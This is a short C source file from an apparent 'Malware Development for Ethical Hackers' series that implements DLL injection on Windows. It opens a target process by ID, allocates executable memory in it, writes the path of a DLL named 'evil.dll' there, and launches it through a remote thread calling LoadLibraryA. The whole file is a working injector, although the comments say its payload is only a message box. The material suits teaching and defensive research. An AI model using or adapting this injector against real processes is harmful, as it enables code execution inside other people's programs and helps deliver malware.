/*
 * Malware Development for Ethical Hackers
 * hack3.c
 * DLL injection example
 * created by: @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// "malicious" DLL: our messagebox
char maliciousDLL[] = "C:\\evil.dll";
unsigned int dll_length = sizeof(maliciousDLL) + 1;

int main(int argc, char* argv[]) {
  HANDLE process_handle; // Handle for the target process
  HANDLE remote_thread; // Handle for the remote thread
  PVOID remote_buffer; // Buffer in the remote process

  // Handle to kernel32 and pass it to GetProcAddress
  HMODULE kernel32_handle = GetModuleHandle("Kernel32");
  VOID *lbuffer = GetProcAddress(kernel32_handle, "LoadLibraryA");

  // Parse the target process ID
  if ( atoi(argv[1]) == 0) {
    printf("Target Process ID not found :( exiting...\n");
    return -1;
  }

  printf("Target Process ID: %i", atoi(argv[1]));
  process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));

  // Allocate memory in the target process for remote buffer
  remote_buffer = VirtualAllocEx(process_handle, NULL, dll_length, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // Copy DLL from our process to the remote process
  WriteProcessMemory(process_handle, remote_buffer, maliciousDLL, dll_length, NULL);

  // Create a remote thread in the target process to start our "malicious" DLL
  remote_thread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)lbuffer, remote_buffer, 0, NULL);
  
  // Clean up and close the process handle
  CloseHandle(process_handle);

  return 0;
}
